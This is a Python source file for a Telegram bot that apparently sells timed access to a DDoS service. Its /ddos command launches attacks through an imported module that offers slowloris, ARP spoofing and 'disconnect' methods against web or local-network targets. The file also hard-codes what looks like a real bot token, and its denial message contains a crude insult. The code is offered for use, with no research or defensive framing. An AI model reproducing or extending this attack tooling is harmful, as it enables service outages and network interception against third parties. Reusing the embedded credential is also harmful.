# -*- coding: utf-8 -*-
import os
import sys

from colorama import Fore

os.chdir(os.path.dirname(os.path.realpath(__file__)))
os.system("cls" if os.name == "nt" else "clear")

try:
    from tools.addons.checks import (check_http_target_input,
                                     check_local_target_input,
                                     check_method_input, check_number_input)
    from tools.addons.ip_tools import show_local_host_ips
    from tools.addons.logo import show_logo
    from tools.method import AttackMethod
except (ImportError, NameError) as err:
    print("\nFailed to import something", err)

from telegram.ext import Updater, CommandHandler

TOKEN = "6832483028:AAGh4WIzI193lg-uDtj9bD1BI_SY-2S7bqc"
access_users = {}

def admin(update, context):
    if update.message.from_user.username == "SoulXcryptic":
        update.message.reply_text("You have admin access. What do you want to do?")
    else:
        update.message.reply_text("Behen k lun otat me! You do not have admin access.")

def add(update, context):
    if update.message.from_user.username == "SoulXcryptic":
        params = context.args
        if len(params) == 3:
            user, daytime, countdown = params
            access_users[user] = (daytime, min(int(countdown), 120))
            update.message.reply_text(f"Added user {user} with parameters: daytime - {daytime}, countdown - {countdown}")
        else:
            update.message.reply_text("Invalid number of parameters. Usage: /add @user daytime countdown")
    else:
        update.message.reply_text("Behen k lun otat me! You do not have admin access.")

def remove(update, context):
    if update.message.from_user.username == "SoulXcryptic":
        user_to_remove = context.args[0]
        if user_to_remove in access_users:
            del access_users[user_to_remove]
            update.message.reply_text(f"Removed access from user {user_to_remove}.")
        else:
            update.message.reply_text(f"User {user_to_remove} does not have access.")
    else:
        update.message.reply_text("Behen k lun otat me! You do not have admin access.")

def plan(update, context):
    if update.message.from_user.username == "SoulXcryptic":
        update.message.reply_text(f"Access users: {access_users}")
    else:
        update.message.reply_text("Behen k lun otat me! You do not have admin access.")

def give_code(update, context):
    if update.message.from_user.username == "SoulXcryptic":
        params = context.args
        if len(params) == 3:
            daytime, countdown, duration = params
            code = f"{daytime}_{countdown}_{duration}"
            update.message.reply_text(f"Generated code: {code}")
        else:
            update.message.reply_text("Invalid number of parameters. Usage: /give_code daytime countdown duration")
    else:
        update.message.reply_text("Behen k lun otat me! You do not have admin access.")

def ddos(update, context):
    show_logo()
    try:
        if (method := check_method_input()) in ["arp-spoof", "disconnect"]:
            show_local_host_ips()
        target = (
            check_http_target_input()
            if method not in ["arp-spoof", "disconnect"]
            else check_local_target_input()
        )
        threads = (
            check_number_input("threads")
            if method not in ["arp-spoof", "disconnect"]
            else 1
        )
        time = check_number_input("time")
        sleep_time = check_number_input("sleep time") if "slowloris" in method else 0

        # Adjust API here if needed
        api_key = "YOUR_API_KEY_HERE"

        with AttackMethod(
            duration=time,
            method_name=method,
            threads=threads,
            target=target,
            sleep_time=sleep_time,
            api_key=api_key,  # Pass the API key here
        ) as attack:
            attack.start()
    except KeyboardInterrupt:
        print(
            f"\n\n{Fore.RED}[!] {Fore.MAGENTA}Ctrl+C detected. Program closed.\n\n{Fore.RESET}"
        )
        sys.exit(1)

def main():
    updater = Updater(TOKEN, use_context=True)
    dispatcher = updater.dispatcher

    dispatcher.add_handler(CommandHandler("admin", admin))
    dispatcher.add_handler(CommandHandler("add", add))
    dispatcher.add_handler(CommandHandler("remove", remove))
    dispatcher.add_handler(CommandHandler("plan", plan))
    dispatcher.add_handler(CommandHandler("give_code", give_code))
    dispatcher.add_handler(CommandHandler("ddos", ddos))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
